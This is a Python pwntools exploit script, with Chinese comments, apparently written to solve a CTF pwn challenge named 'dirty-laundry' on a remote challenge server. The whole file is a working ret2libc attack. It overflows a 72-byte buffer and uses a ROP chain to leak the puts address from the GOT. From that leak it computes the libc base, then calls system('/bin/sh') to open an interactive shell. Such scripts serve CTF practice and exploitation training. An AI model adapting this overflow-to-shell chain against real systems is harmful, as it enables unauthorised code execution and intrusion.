from pwn import *
import sys
context.log_level = 'debug' # 建议开启，方便看远程回传的数据
host = 'dirty-laundry.ctf.prgy.in'
port = 1337
# 只要命令行参数里带 'rem' (例如 python3 exp.py rem)，就连远程
# 否则默认跑本地
if len(sys.argv) > 1 and sys.argv[1] == 'rem':
    # 注意这里加了 ssl=True，因为题目要求 --ssl
    p = remote(host, port, ssl=True) 
else:
    p = process('./chal')
# ... 后面的 payload 发送逻辑 ...
p.recvuntil(b"Add your laundry:")
rdi_r14_ret = 0x4011a7
puts_got = 0x404000
ret_addr = 0x40101a
puts_plt = 0x401030
main_addr = 0x401217
payload1 = b"a"*72 + p64(rdi_r14_ret) + p64(puts_got) + p64(0) + p64(puts_plt) + p64(ret_addr) + p64(main_addr)
p.sendline(payload1)
p.recvuntil(b"Laundry complete")
# 尝试读取一行
recved = p.recvline()
# 调试：打印看看读到了什么，这一步非常重要！
print(f"DEBUG: recved bytes: {recved}")
# 如果读到的仅仅是一个换行符（说明 Laundry complete 后面确实有个孤立的换行）
# 那么真正的泄露数据在下一行，再读一次
if recved == b'\n':
    recved = p.recvline()
    print(f"DEBUG: re-read recved bytes: {recved}")
# 再次检查，防止读到了 "Add your laundry" 这种长字符串
if len(recved) > 8:
    # 可能是读到了后面的提示符，尝试截取前6字节（puts地址通常是6字节）
    # 或者说明偏移有问题
    print("Warning: Received data is too long, truncating...")
    recved = recved[:6] 
else:
    # 正常情况：去掉末尾的 \n
    recved = recved[:-1]
# 补齐并解包
puts_addr = u64(recved.ljust(8, b"\x00"))
print(f"Leak puts_addr: {hex(puts_addr)}")
libc_addr = puts_addr - 0x80e50
system_addr = libc_addr + 0x50d70
bin_sh_addr = libc_addr + 0x1d8678
data = b"/bin/sh\x00"
p.recvuntil(b"Add your laundry:")
#gdb.attach(p)
#p.sendline(cyclic(200))
payload2 =b"a"*72 + p64(ret_addr) + p64(rdi_r14_ret) + p64(bin_sh_addr) + p64(0) + p64(system_addr)
p.sendline(payload2)
p.interactive()
